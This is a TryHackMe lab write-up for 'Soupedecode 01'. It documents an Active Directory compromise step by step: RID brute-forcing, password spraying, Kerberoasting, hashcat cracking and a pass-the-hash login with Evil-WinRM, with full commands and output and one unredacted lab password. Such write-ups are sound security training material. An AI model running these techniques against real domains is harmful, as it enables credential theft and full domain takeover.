---
lab: "Soupedecode 01"
date: "2026-09-23"
platform: "TryHackMe"
difficulty: "Easy"
---
# Room link: https://tryhackme.com/room/soupedecode01

![](../Attachments/Pasted%20image%2020260923143422.png)

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2026-09-22T06:55:53
|_Not valid after:  2027-03-24T06:55:53
|_ssl-date: 2026-09-23T07:02:26+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-23T07:01:46+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49729/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-23T07:01:48
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

I added `DC01.SOUPEDECODE.LOCAL` and `SOUPEDECODE.LOCAL` to `/etc/hosts`.
##### RPC 

Null session is not enabled. 

```bash
$ rpcclient -U "" -N SOUPEDECODE.LOCAL                 
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

##### LDAP

ldapsearch requires authenticated query

```bash
$ ldapsearch -x -H ldap://10.48.173.246:389 -b "DC=SOUPEDECODE,DC=LOCAL"

# extended LDIF
#
# LDAPv3
# base <DC=SOUPEDECODE,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c
```

##### DNS ZONE TRANSFER

Zone transfer denied. DNS server enforces access controls on AXFR requests.

```bash
$ nslookup -type=AXFR SOUPEDECODE.LOCAL 10.48.173.246
Server:         10.48.173.246
Address:        10.48.173.246#53

** server can't find SOUPEDECODE.LOCAL: NXDOMAIN
; Transfer failed.
```

##### SMB Shares (guest)

 Nothing notable here as `IPC$` does not contain any sensitive information.

```powershell
$ nxc smb SOUPEDECODE.LOCAL -u 'guest' -p "" --shares
SMB         10.48.173.246   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.48.173.246   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.48.173.246   445    DC01             [*] Enumerated shares
SMB         10.48.173.246   445    DC01             Share           Permissions     Remark
SMB         10.48.173.246   445    DC01             -----           -----------     ------
SMB         10.48.173.246   445    DC01             ADMIN$                          Remote Admin
SMB         10.48.173.246   445    DC01             backup                          
SMB         10.48.173.246   445    DC01             C$                              Default share
SMB         10.48.173.246   445    DC01             IPC$            READ            Remote IPC
SMB         10.48.173.246   445    DC01             NETLOGON                        Logon server share 
SMB         10.48.173.246   445    DC01             SYSVOL                          Logon server share 
SMB         10.48.173.246   445    DC01             Users                           
```

##### RID-BRUTE

```bash
$ nxc smb SOUPEDECODE.LOCAL -u 'guest' -p "" --rid-brute --log rid.users.txt

026-09-23 15:16:48 | smb.py:299 - INFO - SMB         10.48.173.246   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
2026-09-23 15:16:50 | smb.py:458 - INFO - SMB         10.48.173.246   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             518: SOUPEDECODE\Schema Admins (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
2026-09-23 15:16:53 | smb.py:1898 - INFO - SMB         10.48.173.246   445    DC01             525: SOUPEDECODE\Protected Users (SidTypeGroup)

<SNIP>
```

There's a lot of users on this machine. I did some cleaning on the result so I can do `password spraying`.

```bash
$ grep "SidTypeUser" rid.users.txt | awk -F'\\' '{print $NF}' | awk '{print $1}' | sort -u > users.txt

$ cat users.txt    
aaaron589
aadam701
abianca784
acarl237
acarl386
adelia337
admin
Administrator

<SNIP>
```
##### Password Spraying

I made a customized wordlist for the `Domain itself` because `password spraying` with `rockyou.txt` will take forever. 
I ran two types of password spray, one with the `customized wordlist` and the other with the same `users.txt` file.

It took a long while but the `users.txt:users.txt` pop a valid credential for `ybob317`.

```bash
$ nxc smb SOUPEDECODE.LOCAL -u users.txt -p users.txt --ignore-pw-decoding --continue-on-success --no-brute | grep "\[+\]"
SMB                      10.48.173.246   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:{REDACTED} 
```

##### YBOB317 shares

```powershell
$ nxc smb SOUPEDECODE.LOCAL -u ybob317 -p ybob317 --shares                                                                
SMB         10.48.173.246   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.48.173.246   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.48.173.246   445    DC01             [*] Enumerated shares
SMB         10.48.173.246   445    DC01             Share           Permissions     Remark
SMB         10.48.173.246   445    DC01             -----           -----------     ------
SMB         10.48.173.246   445    DC01             ADMIN$                          Remote Admin
SMB         10.48.173.246   445    DC01             backup                          
SMB         10.48.173.246   445    DC01             C$                              Default share
SMB         10.48.173.246   445    DC01             IPC$            READ            Remote IPC
SMB         10.48.173.246   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.48.173.246   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.48.173.246   445    DC01             Users           READ            
```

This is great because `ybob317` have read access to the shares, specially `Users`. 

```bash
$ smbclient //10.48.173.246/Users -U ybob317

smb: \> ls
  .                                  DR        0  Fri Jul  5 06:48:22 2024
  ..                                DHS        0  Wed Sep 23 14:56:50 2026
  admin                               D        0  Fri Jul  5 06:49:01 2024
  Administrator                       D        0  Wed Sep 23 15:06:24 2026
  All Users                       DHSrn        0  Sat May  8 16:26:16 2021
  Default                           DHR        0  Sun Jun 16 10:51:08 2024
  Default User                    DHSrn        0  Sat May  8 16:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 16:14:03 2021
  Public                             DR        0  Sun Jun 16 01:54:32 2024
  ybob317                             D        0  Tue Jun 18 01:24:32 2024
```

This seems to be the `C:\Users` folder in the machine. I can only access `ybob317's folder` and the `C:\ybob317\Desktop\` contains `user.txt` flag. 
```bash
smb: \ybob317\Desktop\> ls
  .                                  DR        0  Sat Jul 26 01:51:44 2025
  ..                                  D        0  Tue Jun 18 01:24:32 2024
  desktop.ini                       AHS      282  Tue Jun 18 01:24:32 2024
  user.txt                            A       33  Sat Jul 26 01:51:44 2025

```

```bash
smb: \ybob317\Desktop\> get user.txt
getting file \ybob317\Desktop\user.txt of size 33 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

$ cat user.txt 
{REDACTED}
```

Since I have valid credentials, I tried to check for users that `Do not require Kerberos preauthentication` but no entries was found.

```bash
$ GetNPUsers.py -request -dc-ip soup.thm "SOUPEDECODE.LOCAL/ybob317:{REDACTED}"
/usr/local/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260916.40533.c38d1eeb', 'GetNPUsers.py')
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

I tried `GetUserSPNs.py` next to hunt for `service accounts` where I can try and crack their passwords.

```bash
$ GetUserSPNs.py -request -dc-ip soup.thm "SOUPEDECODE.LOCAL/ybob317:{REDACTED}" 
/usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260916.40533.c38d1eeb', 'GetUserSPNs.py')
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-18 01:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-18 01:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-18 01:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-18 01:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-18 01:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$0fe8f7063d985b7157d380380b0e0163$1fa92ce76025a6b4757dfa5ecf19f205d97846180ee6f4d2b1c4af4f4b04ba5aebd677fd650054661e32d50c8f4b4fb6667404132167110dd665cccdcbd28f32acc843be49efcb71e22f80feb2a3d82966415e4c770633d11fe94478fde13b626f67ad5fd0c394027124fb0fb8138e4c9f219f91c12<SNIP>

$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$9b8a7878f81e882acb3fdc010d27454c$c013fcd8921fc40cf6fd3bf849fb390adf0e832219d8701fa640c29fe1640c184c2507b70cf50a53275391364479326397346b9a7352893a3baf93baf8d45067476122d7ed47f0cd9d499b24462dae21be8d071c521888cb080c510a862e8cc388939d78b0bdaae4a0a22455e457bf88802<SNIP>

$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$1f01cef13c6398dec911f136cd26b9a9$e75e77cf78135302b5fb5575d26782adbeb20be9fc1abf78cc4b937c6240e2cd1da995b7f6f0d36f209eb340663a1c2e7ce5812fe28f354144e1c4b26d7824cbe1364e8c162ecd6578f3d4efe846d00a1205d8176640c0044bba5b495ba7efd170fc1006f344bb78061c04713da6b9879f7b78f<SNIP> 

$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$5afd4646b7852f3290d39ac3c56df724$1fd596d782893293eeb3bf14eac1aac982dc9d9130f759c13c6ce157443d99a8bedfb20b0844356bc459a34647d1c71316907afbf5ee751e8bac9c195cd7b<SNIP>

$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$836beac31dfc6c44dc52f61eb0771d51$9528b8632931a9ad9ac7bf04ce3cf9d7fc2b184ff7c6c5552b09c416ea2d31311ea07238fe7d4c43f012a5e93d4545e964256abfe9d9fae<snip>
```

`Service accounts discovered:`

- `file_svc` (FTP/FileServer) 
- `firewall_svc` (FW/ProxyServer)
- `backup_svc` (HTTP/BackupServer)
- `web_svc` (HTTP/WebServer)
- `monitoring_svc` (HTTPS/MonitoringServer)

Save the hashes in a text file.

```bash
$ hashcat -m 13100 -a 0 svc_tickets /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting

$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$0fe8f7063d985b7157d380380b0e0163$1fa92ce76025a6b4757dfa5ecf19f205d97846180ee6f4d2b1c4af4f4b04ba5aebd677fd650054661e32d50c8f4b4fb6667404132167110dd665cccdcbd28f32acc843be49efcb71e22f80feb2a3d82966415e4c770633d11fe94478fde13b626f67ad5fd0c394027124fb0fb8138e4c9f219f91c12<SNIP>:{REDACTED} # <- FILE_SVC Password

```

Things I tried that did not work with these credentials:

- `Evil-WinRM`
- `Bloodhound-python`
- `PsExec.py`

I went back to shares and found that `file_svc` have `READ` permission on share `BACKUP`.

```bash
$ nxc smb SOUPEDECODE.LOCAL -u file_svc -p '{REDACTED}' --shares                                                       
SMB         10.48.173.246   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.48.173.246   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.48.173.246   445    DC01             [*] Enumerated shares
SMB         10.48.173.246   445    DC01             Share           Permissions     Remark
SMB         10.48.173.246   445    DC01             -----           -----------     ------
SMB         10.48.173.246   445    DC01             ADMIN$                          Remote Admin
SMB         10.48.173.246   445    DC01             backup          READ            
SMB         10.48.173.246   445    DC01             C$                              Default share
SMB         10.48.173.246   445    DC01             IPC$            READ            Remote IPC
SMB         10.48.173.246   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.48.173.246   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.48.173.246   445    DC01             Users                           

```

```bash
$ smbclient //10.48.173.246/backup -U file_svc                   
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun 18 01:41:17 2024
  ..                                 DR        0  Sat Jul 26 01:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 16:41:05 2024
```

After transferring it to my attack machine, the `backup_extract.txt` contains `NTLM` hashes of `machine accounts.`

```bash
$ cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
```

Now note that these are service accounts. That means that each of these accounts have their own purposes meaning they can `only access certain stuff` such as:

- `WebServer$` → access IIS, web apps
- `DatabaseServer$` → SQL Server access
- `FileServer$` → SMB shares
- `MailServer$` → Exchange services

I used `FileServer` and perform a `Pass-The-Hash attack` in `Evil-WinRM`

```bash
 evil-winrm -i soup.thm -u SOUPEDECODE.LOCAL\\FileServer\$ -H {REDACTED}
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\FileServer$\Documents> whoami
soupedecode\fileserver$

```

With `FileServer`, It has access to `C:\Users\Administrator` directory where I found `root.txt`.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
{REDACTED}
```

